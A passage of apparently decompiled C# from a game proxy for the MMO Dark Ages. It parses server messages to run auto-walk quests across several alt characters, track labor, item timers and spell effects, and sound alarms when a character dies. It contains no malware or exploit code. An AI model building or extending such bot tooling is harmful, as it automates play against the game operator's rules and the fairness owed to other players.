            index1 = client.CountedMonsters[705];
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = ", R ";
            string[] strArray3 = strArray1;
            index1 = client.CountedMonsters[706];
            string str5 = index1.ToString();
            strArray3[3] = str5;
            strArray1[4] = ", Sq ";
            string[] strArray4 = strArray1;
            index1 = client.CountedMonsters[715];
            string str6 = index1.ToString();
            strArray4[5] = str6;
            strArray1[6] = ", E ";
            string[] strArray5 = strArray1;
            index1 = client.CountedMonsters[716];
            string str7 = index1.ToString();
            strArray5[7] = str7;
            string text = string.Concat(strArray1);
            client1.SendMessage(text, (byte) 18, false);
          }
        }
        if (str1.Contains(" experience!") && client.MapInfo.Name.Contains("Mount Merry 5-"))
        {
          foreach (string groupMember in client.GroupMembers)
          {
            if (groupMember != string.Empty)
            {
              GroupCounts groupCounts = new GroupCounts();
              groupCounts.Name = groupMember.ToLower();
              ++groupCounts.FilthyErbieCount;
              if (client.GroupCounter.ContainsKey(groupMember.ToLower()))
              {
                ++client.GroupCounter[groupMember.ToLower()].FilthyErbieCount;
                if (client.GroupCounter[groupMember.ToLower()].FilthyErbieCount == 20U)
                {
                  client.SendMessage(groupMember + " has killed 20 filthy erbies.", "grey", false);
                  client.GroupCounter[groupMember.ToLower()].FilthyErbieCount = 0U;
                }
              }
              else
                client.GroupCounter.Add(groupMember.ToLower(), groupCounts);
            }
          }
        }
        if (str1.StartsWith("Aha! Tell the mundane monk"))
        {
          client.meditate = false;
          client.meditatedone = true;
          client.mblue = false;
          client.mblack = false;
          client.mbrown = false;
          client.mgreen = false;
          client.myellow = false;
          client.mpurple = false;
          client.mred = false;
          client.mwhite = false;
        }
        if (str1.StartsWith("Path for the sword,") || str1.StartsWith("Path of conquest,") || (str1.StartsWith("If you want to become") || str1.StartsWith("Monks? Consider well")) || (str1.StartsWith("Rogue's path begins") || str1.StartsWith("Wizard, go right to")) || str1.StartsWith("To befriend Nature,"))
          client.tocpopup = true;
        if (str1.Equals("You didn't receive a Stolen Bag") || str1.Equals("You received a Stolen Bag"))
          client.SaveTimedStuff(40);
        if (str1.StartsWith("You feel a touch of light") || str1.Contains(", speaks to you"))
        {
          client.altartimer = DateTime.Now;
          client.SaveTimedStuff(36);
        }
        if (str1.Equals("Nothing here for you, I'm afraid.") || str1.Equals("Your inventory is full.") || str1.StartsWith("Whoa there, you don't have enough room "))
          client.hasparcels = false;
        if (client.atemeg && str1.StartsWith("You receive "))
        {
          client.atemeg = false;
          client.SaveTimedStuff(30);
        }
        if (client.ateabgift && str1.StartsWith("You receive "))
        {
          client.ateabgift = false;
          client.SaveTimedStuff(28);
        }
        if (client.ateabbox && str1.StartsWith("You receive "))
        {
          client.ateabbox = false;
          client.SaveTimedStuff(29);
        }
        if (client.ateclover && str1.StartsWith("You receive "))
        {
          client.ateclover = false;
          client.SaveTimedStuff(13);
        }
        else if (client.ateclover && str1.StartsWith("((Please wait 5 days"))
          client.ateclover = false;
        if (client.ategsf && str1.StartsWith("You receive "))
        {
          client.ategsf = false;
          client.SaveTimedStuff(14);
        }
        else if (client.ategsf && str1.StartsWith("((Please wait 5 days"))
          client.ategsf = false;
        if (str1.Equals("You feel the inner abyss for one Temuairan day"))
        {
          client.ascendtime = DateTime.Now;
          client.SaveTimedStuff(20);
        }
        if (str1.StartsWith("You cast ") && str1.Contains(" Prayer") && client.MapInfo.Tiles[client.ServerLocation.X, client.ServerLocation.Y] != null)
        {
          client.MapInfo.Tiles[client.ServerLocation.X, client.ServerLocation.Y].PrayerTimer = DateTime.UtcNow;
          client.MapInfo.Tiles[client.ServerLocation.X, client.ServerLocation.Y].prayermessagesent = false;
        }
        if (str1.StartsWith("You cast Gem Polishing."))
        {
          string key = client.ServerLocation.X.ToString() + "," + (object) client.ServerLocation.Y;
          if (!client.GemPolish.ContainsKey(key))
            client.GemPolish.Add(key, DateTime.UtcNow);
          else
            client.GemPolish[key] = DateTime.UtcNow;
        }
        if (!str1.Contains("None by that name here"))
          ;
        if (str1.Contains("It's too heavy."))
          client.tooheavy = true;
        if (str1.Contains("You were distracted"))
          client.distracted = true;
        if (str1.Contains("assists your Tailoring") || str1.Contains("helps you collect") || (str1.Contains("assists your wizardry research") || str1.Contains("prays for your success")) || str1.Contains("helps you prepare the"))
          client.assisted = true;
        if (str1.StartsWith("You work for") || str1.StartsWith("You complete your") || str1.StartsWith("You pray") || str1 == "Some of your coins have split")
          client.polishsuccess = 1;
        if (str1.Contains(" doesn't need any jobs done. ") || str1.Contains(", although the Aisling didn't need much done"))
          client.polishsuccess = 2;
        if (str1.Contains(" is not near"))
          client.polishsuccess = 3;
        if (str1.Equals("You tailor well") || str1.Equals("You tailor excellently") || str1.Equals("You tailor a masterpiece garment") || str1.Equals("You tailor a garment that has no equal"))
          client.polishsuccess = 1;
        if (str1.Equals("You tailor, but do not improve the garment"))
          client.polishsuccess = 2;
        if (str1.Equals("You tailor horribly"))
          client.polishsuccess = 3;
        if (str1.Equals("You succeed at polishing"))
          client.polishsuccess = 1;
        if (str1.Equals("You polish, but it doesn't improve the gem"))
          client.polishsuccess = 2;
        if (str1.Equals("You crack a gem and blister yourself"))
          client.polishsuccess = 3;
        TimeSpan timeSpan;
        if (str1.StartsWith("(( 4 Tem") || str1.Contains("but you have no time") || str1.StartsWith("You do not have time") || str1.Equals("You have no more time for these four Temuairan days"))
        {
          if (client.autowalkon)
          {
            client.SendMessage("No labor, auto-walk stopped.", (byte) 0, false);
            client.Tab.autowalker_button.Text = "Start";
            client.autowalkon = false;
          }
          client.outoflabor = true;
          int num2;
          if (!(client.labortime == DateTime.MinValue))
          {
            timeSpan = DateTime.Now.Subtract(client.labortime);
            num2 = timeSpan.TotalMinutes <= 720.0 ? 1 : 0;
          }
          else
            num2 = 0;
          if (num2 == 0)
          {
            client.labortime = DateTime.Now;
            client.SaveTimedStuff(32);
            client.SendMessage("Labor time saved", (byte) 0, false);
          }
          if (str1.StartsWith("(( 4 Tem") && (client.Tab.improveskill.Text.Equals("Tailoring (cowl)") || client.Tab.improveskill.Text.Equals("Tailoring") || client.Tab.improveskill.Text.Equals("Blade Smith")) || str1.Contains("but you have no time"))
          {
            if (client.Tab.requestlabor.Checked && client.Tab.requestlabornametext.Text != string.Empty)
              client.Whisper(client.Tab.requestlabornametext.Text, client.Tab.requestlabormessagetext.Text);
            else
              client.SendMessage("You are out of labor!", (byte) 0, false);
            client.waitingforlabor = true;
            client.Tab.impskillbutton.Text = "Start";
          }
          if (client.Tab.vpraybutton)
          {
            if (client.Tab.requestlabor.Checked && client.Tab.requestlabornametext.Text != string.Empty)
              client.Whisper(client.Tab.requestlabornametext.Text, client.Tab.requestlabormessagetext.Text);
            else
              client.SendMessage("You are out of labor!", (byte) 0, false);
            client.waitingforlabor = true;
            client.Tab.praybutton.Text = "Start";
          }
        }
        if (str1.Contains("works for you for 1 day"))
        {
          client.outoflabor = false;
          if (client.laborcount > 0)
            --client.laborcount;
        }
        if (str1.StartsWith("You notice ") && str1.Contains(" but you do not have "))
        {
          client.herbnodewaittime = DateTime.MinValue;
          client.Tab.impskillbutton.Text = "Start";
          if (str1.Contains("Wine"))
          {
            client.outofwine = true;
            client.SendMessage("Get more wine.", (byte) 0, false);
          }
        }
        if (str1.StartsWith("He tells you to search the book case"))
        {
          foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
          {
            if (client1.Name.ToLower() == client.GroupMembers[0].ToLower() || client1.Name.ToLower() == client.Name.ToLower())
            {
              client1.Tab.mediumwalk.Checked = true;
              client1.Tab.autowalker_locales.SelectedItem = (object) "Loures";
              client1.Tab.walklocaleslist.SelectedItem = (object) "Library";
              client1.Tab.autowalker_button.Text = "Stop";
              client1.autowalkon = true;
              client1.letterquest = 5;
              client1.lettercourtney = false;
            }
          }
        }
        if (str1.Contains("Find Baltasar and say"))
        {
          foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
          {
            if (client1.Name.ToLower() == client.GroupMembers[0].ToLower() || client1.Name.ToLower() == client.Name.ToLower())
            {
              client1.Tab.mediumwalk.Checked = true;
              client1.Tab.autowalker_locales.SelectedItem = (object) "Rucesion";
              client1.Tab.walklocaleslist.SelectedItem = (object) "Skill Master";
              client1.Tab.autowalker_button.Text = "Stop";
              client1.autowalkon = true;
              client1.letterquest = 4;
              if (client1.HasItem("Loures Song"))
                client1.UseItem("Loures Song");
              else if (client1.HasItem("Abel Song"))
                client1.UseItem("Abel Song");
            }
          }
        }
        if (str1.Contains("Return to Aoife"))
        {
          foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
          {
            if (client1.Name.ToLower() == client.GroupMembers[0].ToLower() || client1.Name.ToLower() == client.Name.ToLower())
            {
              client1.Tab.mediumwalk.Checked = true;
              client1.Tab.autowalker_locales.SelectedItem = (object) "Mileth";
              client1.Tab.walklocaleslist.SelectedItem = (object) "Temple of Choosing";
              client1.Tab.autowalker_button.Text = "Stop";
              client1.autowalkon = true;
              client1.letterquest = 6;
              if (client1.HasItem("Abel Song"))
                client1.UseItem("Abel Song");
              else if (client1.HasItem("Loures Song"))
                client1.UseItem("Loures Song");
            }
          }
        }
        if (str1.Contains("Return to Frida"))
        {
          foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
          {
            if (client1.Name.ToLower() == client.GroupMembers[0].ToLower() || client1.Name.ToLower() == client.Name.ToLower())
            {
              client1.Tab.mediumwalk.Checked = true;
              client1.Tab.autowalker_locales.SelectedItem = (object) "Abel";
              client1.Tab.walklocaleslist.SelectedItem = (object) "Tavern";
              client1.Tab.autowalker_button.Text = "Stop";
              client1.autowalkon = true;
              client1.letterquest = 6;
              if (client1.HasItem("Abel Song"))
                client1.UseItem("Abel Song");
              else if (client1.HasItem("Loures Song"))
                client1.UseItem("Loures Song");
            }
          }
        }
        if (str1.Contains("Return to Riona"))
        {
          foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
          {
            if (client1.Name.ToLower() == client.GroupMembers[0].ToLower() || client1.Name.ToLower() == client.Name.ToLower())
            {
              client1.Tab.mediumwalk.Checked = true;
              client1.Tab.autowalker_locales.SelectedItem = (object) "Mileth";
              client1.Tab.walklocaleslist.SelectedItem = (object) "Inn";
              client1.Tab.autowalker_button.Text = "Stop";
              client1.autowalkon = true;
              client1.letterquest = 6;
              if (client1.HasItem("Abel Song"))
                client1.UseItem("Abel Song");
              else if (client1.HasItem("Loures Song"))
                client1.UseItem("Loures Song");
            }
          }
        }
        if (str1.Contains("Return to Duana"))
        {
          foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
          {
            if (client1.Name.ToLower() == client.GroupMembers[0].ToLower() || client1.Name.ToLower() == client.Name.ToLower())
            {
              client1.Tab.mediumwalk.Checked = true;
              client1.Tab.autowalker_locales.SelectedItem = (object) "Mileth";
              client1.Tab.walklocaleslist.SelectedItem = (object) "Tavern";
              client1.Tab.autowalker_button.Text = "Stop";
              client1.autowalkon = true;
              client1.letterquest = 6;
              if (client1.HasItem("Abel Song"))
                client1.UseItem("Abel Song");
              else if (client1.HasItem("Loures Song"))
                client1.UseItem("Loures Song");
            }
          }
        }
        if ((str1.StartsWith("Your HP increased from") || str1.StartsWith("Your MP increased from")) && client.beforeascend > 0U)
        {
          string[] strArray = str1.Remove(str1.IndexOf('.')).Split(' ');
          int num2 = int.Parse(strArray[6]) - int.Parse(strArray[4]);
          DateTime now2 = DateTime.Now;
          AscendData z = new AscendData();
          z.Time = string.Format("{0:M/d/yy h:mm tt}", (object) now2);
          z.Name = client.Name;
          z.EXP = (client.beforeascend - client.Statistics.Experience).ToString("#,##0");
          z.Increase = num2.ToString("#,##0") + " " + strArray[1];
          Server.AscendLog.Add(z);
          this.SaveAscendLog();
          this.PopulateAscendLogListView(z);
          client.beforeascend = 0U;
        }
        if (str1.StartsWith("No more experience") && client.Statistics.Experience > 4000000000U && !client.ascendexp)
          client.ascendexp = true;
        if (str1.Equals("Already a member of another group.") || str1.Equals("Cannot find group member."))
          return false;
        if (!str1.StartsWith("You can't attack"))
          ;
        if (str1.StartsWith("You don't have the right key") && client.MainTarget != null && (client.MainTarget.Image == 456 && client.MainTarget.Lured) && client.MonsterInFront() != null && client.MainTarget == client.MonsterInFront())
        {
          client.Characters[client.MainTarget.ID].WrongKey = true;
          client.MainTarget = (Npc) null;
          client.SendMessage("wrong key true", (byte) 0, false);
        }
        if (str1.StartsWith("You cast ") || str1.StartsWith("You failed ") || (str1.StartsWith("You already") || str1.StartsWith("Another curse")) || (str1.StartsWith("The magic") || str1.StartsWith("Your eye lids are becoming heavier.")) || str1.StartsWith("Your hands are shaking"))
        {
          client.lastsuccessfulcast = DateTime.UtcNow;
          client.castonghosttimer = DateTime.MinValue;
        }
        if (str1.Equals("You cast Paralyze Realm."))
          client.pftime = DateTime.UtcNow;
        if (str1.ToLower().Contains("your hands are shaking"))
        {
          client.shakeyhandsdelay = DateTime.UtcNow;
          client.shakeyhands = true;
        }
        if (str1.Equals("You are facing death.") || str1.Equals("You are too injured to move."))
        {
          if (client.skullalert)
          {
            client.SendMessage(client.Name + " skulled!", "red", true);
            client.skullalert = false;
          }
          client.Disenchanter = (Npc) null;
          client.disIsSummoned = false;
          client.distime = DateTime.MinValue;
          client.IsSkulled = true;
          Server.StaticCharacters[client.PlayerID].IsSkulled = true;
          if (client.skullalertdelay == DateTime.MinValue)
            client.skullalertdelay = DateTime.UtcNow;
          timeSpan = DateTime.UtcNow.Subtract(client.skullalertdelay);
          if (timeSpan.TotalMilliseconds > 6000.0 && Program.MainForm.alertonskull.Checked && !Server.SentryAlarm)
          {
            Server.SentryAlarm = true;
            Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.MotherElevatorMuzak.wav"));
            Server.alarmTimer = DateTime.UtcNow;
            Server.alarm.PlayLooping();
            client.skullalertdelay = DateTime.UtcNow;
          }
        }
        if (str1.Equals("Restored."))
        {
          if (Program.MainForm.alertonskull.Checked)
          {
            Server.SentryAlarm = false;
            Server.alarmTimer = DateTime.MinValue;
            if (Server.alarm != null)
              Server.alarm.Stop();
          }
          client.skullalertdelay = DateTime.MinValue;
          client.skullalert = true;
          client.IsSkulled = false;
          Server.SkullList.Remove(client.Name);
          Server.StaticCharacters[client.PlayerID].IsSkulled = false;
          client.SendMessage(client.Name + " was redded.", "grey", true);
          if (Program.MainForm.skulledlistview.Items.Count > 0 && Program.MainForm.skulledlistview.Items.ContainsKey(client.Name))
          {
            if (Server.SkullList.ContainsKey(client.Name))
              Server.SkullList.Remove(client.Name);
            foreach (ListViewItem listViewItem in Program.MainForm.skulledlistview.Items)
              Program.MainForm.skulledlistview.Items.Remove(listViewItem);
            this.SaveSkullList();
          }
        }
        if (str1.Equals("You lost 50 vitality.") || str1.StartsWith("You lost ") && str1.Contains(" experience."))
        {
          if (Program.MainForm.alertondeath.Checked && !Server.SentryAlarm)
          {
            Server.SentryAlarm = true;
            Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.Dcalarm1.wav"));
            Server.alarmTimer = DateTime.UtcNow;
            Server.alarm.Play();
          }
          client.skullalert = true;
          client.Disenchanter = (Npc) null;
          client.disIsSummoned = false;
          client.distime = DateTime.MinValue;
          client.IsSkulled = false;
          Server.SkullList.Remove(client.Name);
          Server.StaticCharacters[client.PlayerID].IsSkulled = false;
          client.SendMessage(client.Name + " died!", "red", true);
        }
        if (str1.Equals("You canot see anything."))
        {
          client.ImBlind = true;
          if (!client.SafeToWalkFast)
          {
            client.LastPermMessage = "{=qYou are blind";
            client.SendMessage("{=qYou are blind", (byte) 18, false);
          }
        }
        if (str1.Equals("You can see again."))
        {
          if (client.LastPermMessage.Contains("You are blind"))
          {
            client.LastPermMessage = "";
            client.SendMessage("", (byte) 18, false);
          }
          client.ImBlind = false;
        }
        if (str1.Equals("You are in hibernation.") || str1.Equals("Your body is freezing."))
          client.IsSuained = true;
        if (str1.Equals("Your body thaws."))
          client.IsSuained = false;
        if (str1.Equals("Stunned") && !client.MapInfo.Name.Contains("Chaos"))
          client.IsStunned = true;
        if (str1.Equals("A fume rises and you suddenly feel sleepy"))
          client.IsStunned = false;
        if (str1.Equals("You can move again."))
          client.IsStunned = false;
        if (str1.Equals("Kaze") && client.clickedamonster && client.Characters.ContainsKey(client.lastclickentityID) && client.Characters[client.lastclickentityID] != null)
        {
          client.Characters[client.lastclickentityID].Name = "Kaze";
          client.clickedamonster = false;
          return false;
        }
        if (str1.Equals("Norajo") && client.clickedamonster && client.Characters.ContainsKey(client.lastclickentityID) && client.Characters[client.lastclickentityID] != null)
        {
          client.Characters[client.lastclickentityID].Name = "Norajo";
          client.clickedamonster = false;
          return false;
        }
        if (str1.Contains("Worker") && client.clickedamonster && client.Characters.ContainsKey(client.lastclickentityID) && client.Characters[client.lastclickentityID] != null)
        {
          client.Characters[client.lastclickentityID].Name = "Worker";
          client.clickedamonster = false;
          return false;
        }
        if (str1.Equals("You cast Disenchanter."))
        {
          if (client.disenchanterappears)
          {
            client.disIsSummoned = true;
            client.distime = DateTime.UtcNow;
            client.disenchanterappears = false;
            if (client.discasttime == DateTime.MinValue)
              client.discasttime = DateTime.UtcNow;
          }
          else
          {
            client.Disenchanter = (Npc) null;
            client.disIsSummoned = false;
            client.distime = DateTime.MinValue;
          }
        }
        if (str1.Equals("It does not touch the spirit world.", StringComparison.CurrentCultureIgnoreCase) && (client.LastMonsterId != 0U && client.Characters.ContainsKey(client.LastMonsterId) && (client.Characters[client.LastMonsterId] != null && client.Characters[client.LastMonsterId] is Npc) && client.Characters[client.LastMonsterId].IsOnScreen))
          client.Characters[client.LastMonsterId].IsDead = true;
        if (str1.Contains("is joining this group.") || str1.Contains("is leaving this group.") || str1.Equals("Group disbanded."))
          client.RequestGroupList();
        if (string.Equals(str1, "You can't use skills here.", StringComparison.CurrentCulture))
        {
          if (!client.CantSkillMaps.Contains(client.MapInfo.Number))
          {
            client.CantSkillMaps.Add(client.MapInfo.Number);
            Client client1 = client;
            string[] strArray1 = new string[5]
            {
              "Map ",
              null,
              null,
              null,
              null
            };
            string[] strArray2 = strArray1;
            index1 = client.MapInfo.Number;
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = " (";
            strArray1[3] = client.MapInfo.Name;
            strArray1[4] = ") needs added to CantSkillMaps list.";
            string message = string.Concat(strArray1);
            client1.SendMessage(message, "pink", false);
          }
          client.skillmap = false;
        }
        if (string.Equals(str1, "That doesn't work here.", StringComparison.CurrentCulture))
        {
          if (!client.CantSpellMaps.Contains(client.MapInfo.Number))
          {
            client.CantSpellMaps.Add(client.MapInfo.Number);
            Client client1 = client;
            string[] strArray1 = new string[5]
            {
              "Map ",
              null,
              null,
              null,
              null
            };
            string[] strArray2 = strArray1;
            index1 = client.MapInfo.Number;
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = " (";
            strArray1[3] = client.MapInfo.Name;
            strArray1[4] = ") needs added to CantSpellMaps list.";
            string message = string.Concat(strArray1);
            client1.SendMessage(message, "pink", false);
          }
          client.spellmap = false;
        }
        if (str1.ToLower().StartsWith("another curse") && (client.LastSpell != string.Empty && client.LastTarget != 0U && (client.Characters.ContainsKey(client.LastTarget) && client.Characters[client.LastTarget] != null) && Server.StaticCharacters.ContainsKey(client.LastTarget) && Server.StaticCharacters[client.LastTarget] != null))
        {
          ++client.Characters[client.LastTarget].AnotherCurseCount;
          if (!client.staffnow.Equals("Empowered Holy Gnarl"))
          {
            if (client.Characters[client.LastTarget].AnotherCurseCount >= 2)
            {
              if (str1.Contains("ard cradh"))
              {
                if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(257))
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[257] = DateTime.UtcNow;
                else
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(257, DateTime.UtcNow);
                if (client.Tab.vmonitorcurses && client.Characters[client.LastTarget] is Player)
                  client.UpdatePlayerImage(client.Characters[client.LastTarget] as Player);
              }
              if (str1.Contains("mor cradh"))
              {
                if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(243))
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[243] = DateTime.UtcNow;
                else
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(243, DateTime.UtcNow);
              }
              if (str1.Contains("cradh"))
              {
                if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(258))
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[258] = DateTime.UtcNow;
                else
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(258, DateTime.UtcNow);
              }
              if (str1.Contains("bardo"))
              {
                if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(44))
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[44] = DateTime.UtcNow;
                else
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(44, DateTime.UtcNow);
              }
              if (str1.Contains("Dark Seal"))
              {
                if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(104))
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[104] = DateTime.UtcNow;
                else
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(104, DateTime.UtcNow);
                if (client.Tab.vmonitorcurses && client.Characters[client.LastTarget] is Player)
                  client.UpdatePlayerImage(client.Characters[client.LastTarget] as Player);
              }
              if (str1.Contains("Darker Seal"))
              {
                if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(82))
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[82] = DateTime.UtcNow;
                else
                  Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(82, DateTime.UtcNow);
                if (client.Tab.vmonitorcurses && client.Characters[client.LastTarget] is Player)
                  client.UpdatePlayerImage(client.Characters[client.LastTarget] as Player);
              } //possibly fixing demise ID issue
              if (str1.Contains("Demise"))
                            {
                                if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(75))
                                    Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[75] = DateTime.UtcNow;
                                else
                                    Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(75, DateTime.UtcNow);
                                if (client.Tab.vmonitorcurses && client.Characters[client.LastTarget] is Player)
                                    client.UpdatePlayerImage(client.Characters[client.LastTarget] as Player);
                            }
              client.Characters[client.LastTarget].AnotherCurseCount = 0;
            }
          }
          else if ((client.staffnow.Equals("Empowered Holy Gnarl") || str1.Contains("beag cradh")) && client.Characters[client.LastTarget].AnotherCurseCount > 4)
          {
            if (str1.Contains("ard cradh"))
            {
              if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(257))
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[257] = DateTime.UtcNow;
              else
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(257, DateTime.UtcNow);
              if (client.Tab.vmonitorcurses && client.Characters[client.LastTarget] is Player)
                client.UpdatePlayerImage(client.Characters[client.LastTarget] as Player);
            }
            if (str1.Contains("mor cradh"))
            {
              if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(243))
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[243] = DateTime.UtcNow;
              else
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(243, DateTime.UtcNow);
            }
            if (str1.Contains("cradh"))
            {
              if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(258))
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[258] = DateTime.UtcNow;
              else
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(258, DateTime.UtcNow);
            }
            if (str1.Contains("bardo"))
            {
              if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(44))
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[44] = DateTime.UtcNow;
              else
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(44, DateTime.UtcNow);
            }
            if (str1.Contains("beag cradh"))
            {
              if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(259))
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[259] = DateTime.UtcNow;
              else
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(259, DateTime.UtcNow);
            }
            client.Characters[client.LastTarget].AnotherCurseCount = 0;
          }
        }
        if (str1.ToLower().StartsWith("you already cast") && (client.LastSpell != string.Empty && client.LastTarget != 0U && (client.Characters.ContainsKey(client.LastTarget) && client.Characters[client.LastTarget] != null) && Server.StaticCharacters.ContainsKey(client.LastTarget) && Server.StaticCharacters[client.LastTarget] != null))
        {
          if (client.LastSpell.Contains("fas nadur") && client.Characters[client.LastTarget] is Npc)
          {
            ++client.Characters[client.LastTarget].AnotherFasCount;
            if (client.Characters[client.LastTarget].AnotherFasCount > 4)
            {
              if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(273))
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[273] = DateTime.UtcNow;
              else
                Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(273, DateTime.UtcNow);
              client.Characters[client.LastTarget].AnotherFasCount = 0;
            }
          }
          if (client.LastSpell.Contains("aite"))
          {
            if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(231))
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[231] = DateTime.UtcNow;
            else
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(231, DateTime.UtcNow);
            if (client.Tab.vmonitorspells && client.Characters[client.LastTarget] is Player)
              client.UpdatePlayerImage(client.Characters[client.LastTarget] as Player);
          }
          if (client.LastSpell.Contains("fas nadur") && client.Characters[client.LastTarget] is Player)
          {
            if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(273))
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[273] = DateTime.UtcNow;
            else
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(273, DateTime.UtcNow);
            if (client.Tab.vmonitorspells && client.Characters[client.LastTarget] is Player)
              client.UpdatePlayerImage(client.Characters[client.LastTarget] as Player);
          }
          if (client.LastSpell.Contains("beannaich"))
          {
            if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(280))
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[280] = DateTime.UtcNow;
            else
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(280, DateTime.UtcNow);
          }
          if (client.LastSpell.Contains("armachd"))
          {
            if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(20))
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[20] = DateTime.UtcNow;
            else
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(20, DateTime.UtcNow);
          }
          if (client.LastSpell.Contains("creag neart"))
          {
            if (Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.ContainsKey(6))
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory[6] = DateTime.UtcNow;
            else
              Server.StaticCharacters[client.LastTarget].SpellAnimationHistory.Add(6, DateTime.UtcNow);
          }
        }
        if (client.Tab.recorditemdata.Checked && (!char.IsPunctuation(str1.Last<char>()) && str1 != "Harden body spell" && (!str1.Contains(" member ") && !str1.Contains(" picks up ")) && (str1 != "Poison" && !str1.Contains("cradh") && (str1 != "In sleep" && str1 != "Awake")) && (str1 != "double attribute" && !str1.Contains<char>('"') && (!str1.Contains("!") && !str1.Contains(">")) && (!str1.Contains(":") && !str1.StartsWith("The scent"))) && ((!str1.Equals(" Boots") ? (!str1.StartsWith(" ") ? 1 : 0) : 1) != 0 && !str1.StartsWith("You ") && (!str1.StartsWith("Your ") && str1 != "Rento") && (str1 != "Halting" && str1 != "Halt" && (str1 != "Pause" && str1 != "Purify")) && (!str1.Contains("Sun, ") && str1 != "Bardo" && (str1 != "Stunned" && str1 != "Dark Seal") && (str1 != "Can't exchange" && !str1.StartsWith("Something terrible") && (str1 != "Summoner Attack Silence" && !str1.StartsWith("Spell Attack Silence")))) && (!str1.StartsWith("Counter Attack") && !str1.StartsWith("Regeneration") && (!str1.StartsWith("ABILITY_") && !str1.StartsWith("A fume rises and you")) && (!str1.Equals("All goes black") && !str1.StartsWith("Something sticks into you skin")))) && !str1.Equals("A sharp stick pricks you")))
        {
          if (!Server.entitynametesting.Contains(str1))
          {
            Server.entitynametesting.Add(str1);
            if (!str1.Equals("fior sal") && !str1.Equals("fior athar") && (!str1.Equals("fior creag") && !str1.Equals("fior srad")) && (!str1.Equals("Gold Pile") && !str1.Equals("Gold Coin") && !str1.Equals("Silver Pile")) && !str1.Equals("Silver Coin"))
              client.SendMessage(str1, (byte) 0, false);
          }
          if (client.ClickedEntityID != 0U)
          {
            if (client.Characters.ContainsKey(client.ClickedEntityID))
              client.Characters[client.ClickedEntityID].Name = str1;
            client.ClickedEntityID = 0U;
            client.EntityClickTimer = DateTime.MinValue;
            return false;
          }
        }
      }
      if (num1 == (byte) 0)
      {
        if (str1.Contains(" can't hear you."))
          client.whisperagain = DateTime.UtcNow;
        int startIndex1 = str1.IndexOf(">");
        int startIndex2 = str1.IndexOf('"');
        string name = string.Empty;
        string str4 = string.Empty;
        bool flag = false;
        if (startIndex1 > -1 && (startIndex2 == -1 || startIndex1 < startIndex2))
        {
          name = str1.Remove(startIndex1);
          str4 = str1.Remove(0, startIndex1 + 2);
          flag = true;
        }
        else if (startIndex2 > -1 && (startIndex1 == -1 || startIndex2 < startIndex1))
        {
          name = str1.Remove(startIndex2);
